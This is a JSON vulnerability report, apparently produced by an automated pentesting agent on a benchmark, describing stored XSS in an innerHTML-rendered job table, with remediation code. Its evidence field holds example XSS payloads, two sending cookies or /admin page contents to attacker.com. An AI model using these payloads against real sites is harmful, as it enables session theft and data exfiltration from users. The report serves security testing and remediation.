{
  "title": "Stored XSS in Job Data Display",
  "severity": "HIGH",
  "description": "The application displays job data (name, description, type) directly in the HTML table using innerHTML without proper HTML encoding or escaping. The vulnerable client-side code constructs and renders job data as follows:\n\n```javascript\njobsTable += `\n    <tr>\n        <td>${job.id}</td>\n        <td>${job.name}</td>\n        <td>${job.type}</td>\n        <td>${job.description}</td>\n    </tr>\n`;\nresultDiv.innerHTML = jobsTable;\n```\n\nThe vulnerability exists because:\n1. Template literals with unescaped variables (${job.name}, ${job.description}, ${job.type}) are used to construct HTML\n2. The resulting HTML string is assigned directly to element.innerHTML, which parses and executes any embedded HTML/JavaScript\n3. There is no input validation, output encoding, or sanitization applied to job data before rendering\n\nIf any job record in the database contains HTML or JavaScript code in the name, type, or description fields, the code will execute when the jobs are displayed. This is a classic Stored XSS vulnerability where malicious payloads are persisted in the database and executed in every user's browser.",
  "impact": "An attacker who can inject XSS payloads into job data (either through direct database access, compromised API endpoints, or other injection vulnerabilities) can execute arbitrary JavaScript in every user's browser when they view jobs. This could lead to:\n\n- Session hijacking via cookie/token theft\n- Credential harvesting through fake login prompts\n- Malware distribution and drive-by downloads\n- Manipulation of page content and functionality\n- Unauthorized actions performed on behalf of users\n- Phishing attacks targeting application users\n- Defacement of the application interface",
  "endpoint": "http://localhost:8000/",
  "evidence": "POC Execution Output:\n```\n[+] Found 'innerHTML' usage in response - vulnerable code pattern detected\n[+] Found unescaped template literals '${job.' - vulnerable variable interpolation detected\n[+] VULNERABILITY CONFIRMED: innerHTML + unescaped template literals\n[+] Found vulnerable pattern: resultDiv.innerHTML\n[+] STORED XSS VULNERABILITY CONFIRMED\n```\n\nExample payloads that would execute:\n1. Image onerror: `<img src=x onerror=\"alert('XSS_STORED')\">`\n2. SVG onload: `<svg onload=\"fetch('http://attacker.com/steal?data='+document.cookie)\">`\n3. Script tag: `<script>fetch(\"/admin\").then(r=>r.text()).then(d=>fetch(\"http://attacker.com?data=\"+btoa(d)))</script>`\n\nWhen any of these payloads are stored in job database records (name, type, or description), they execute immediately when the jobs are displayed due to innerHTML interpretation of unescaped template literals.",
  "pocPath": "pocs/poc_stored_xss_job_data.sh",
  "remediation": "1. **Replace innerHTML with safer methods**: Use textContent for plain text display, or use innerText which automatically escapes HTML\n2. **Implement proper HTML encoding**: Apply HTML entity encoding to all user-controlled data before display (e.g., &lt;, &gt;, &quot;, &#x27;, &#x2F;)\n3. **Use templating libraries with auto-escaping**: Migrate to React, Vue, Angular, or similar frameworks that auto-escape by default\n4. **Use DOM methods for safe element creation**: Instead of string concatenation + innerHTML, use document.createElement() and appendChild()\n5. **Implement Content Security Policy (CSP)**: Add CSP headers (Content-Security-Policy: default-src 'self'; script-src 'self') to mitigate XSS impact even if vulnerabilities exist\n6. **Input validation on server-side**: Validate job data to reject or sanitize HTML/JavaScript content at the source\n7. **Use security libraries**: If HTML rendering is necessary, use DOMPurify or similar sanitization libraries to remove malicious content\n8. **Regular security testing**: Implement automated security scanning and manual penetration testing to identify similar vulnerabilities\n\n**Recommended Quick Fix:**\nReplace vulnerable code:\n```javascript\nresultDiv.innerHTML = jobsTable;\n```\nWith safe alternative:\n```javascript\nconst table = document.createElement('table');\njobs.forEach(job => {\n    const row = document.createElement('tr');\n    row.appendChild(createCell(job.id));\n    row.appendChild(createCell(job.name)); // textContent automatically escapes\n    row.appendChild(createCell(job.type));\n    row.appendChild(createCell(job.description));\n    table.appendChild(row);\n});\nresultDiv.appendChild(table);\n\nfunction createCell(content) {\n    const cell = document.createElement('td');\n    cell.textContent = content; // Safe: no HTML execution\n    return cell;\n}\n```",
  "references": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'), OWASP Top 10 2021 - A03:2021 Injection, OWASP XSS Prevention Cheat Sheet, OWASP DOM based XSS Prevention",
  "toolCallDescription": "Documenting the Stored XSS vulnerability in job data display with confirmed POC execution showing innerHTML + unescaped template literal vulnerability",
  "timestamp": "2025-11-10T15:08:22.964Z",
  "sessionId": "benchmark-XBEN-038-24-mht9rpjz",
  "target": "./repo"
}